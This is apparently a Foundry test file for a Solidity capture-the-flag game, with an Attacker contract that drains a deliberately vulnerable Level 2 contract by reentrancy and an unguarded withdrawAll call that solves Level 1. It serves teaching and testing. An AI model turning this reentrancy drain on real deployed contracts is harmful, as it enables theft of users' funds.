// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {CTFFactory} from "../src/CTFFactory.sol";
import {Level2_Reentrancy} from "../src/Level2_Reentrancy.sol";
import {Level1_AccessControl} from "../src/Level1_AccessControl.sol";

// Malicious contract that executes the recursive reentrancy exploit
contract Attacker {
    Level2_Reentrancy public target;

    constructor(address _target) {
        target = Level2_Reentrancy(_target);
    }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }
}

contract Level2ReentrancyTest is Test {
    CTFFactory public factory;
    address public player = address(0x1234);

    function setUp() public {
        factory = new CTFFactory(address(0x1111222233334444555566667777888899990000));
        vm.deal(player, 1 ether);
    }

    function test_RevertIfLevel1NotSolved() public {
        vm.startPrank(player);
        vm.expectRevert("Must solve Level 1 first");
        factory.deployLevel2{value: 0.01 ether}();
        vm.stopPrank();
    }

    function test_ReentrancyExploitAndValidation() public {
        vm.startPrank(player);

        // 1. Solve Level 1 to unlock Level 2
        address l1InstanceAddr = factory.deployLevel1{value: 0.01 ether}();
        Level1_AccessControl l1Target = Level1_AccessControl(l1InstanceAddr);
        l1Target.withdrawAll(payable(player));
        factory.validateLevel1();

        // 2. Deploy Level 2 instance ( funded with 0.01 ETH )
        address instanceAddr = factory.deployLevel2{value: 0.01 ether}();
        assertEq(instanceAddr.balance, 0.01 ether, "Instance not funded");

        // 3. Deploy Attacker contract and execute exploit
        Attacker attacker = new Attacker(instanceAddr);
        attacker.attack{value: 0.001 ether}();

        // 4. Verify target contract has been drained to 0
        assertEq(instanceAddr.balance, 0, "Target contract not drained");

        // 5. Validate hack on the Factory to claim Soulbound Badge
        factory.validateLevel2();

        // 6. Assert that the player now owns Soulbound Badge #2
        uint256 badgeBalance = factory.badgeContract().balanceOf(player, 2);
        assertEq(badgeBalance, 1, "Soulbound Badge not minted");

        vm.stopPrank();
    }
}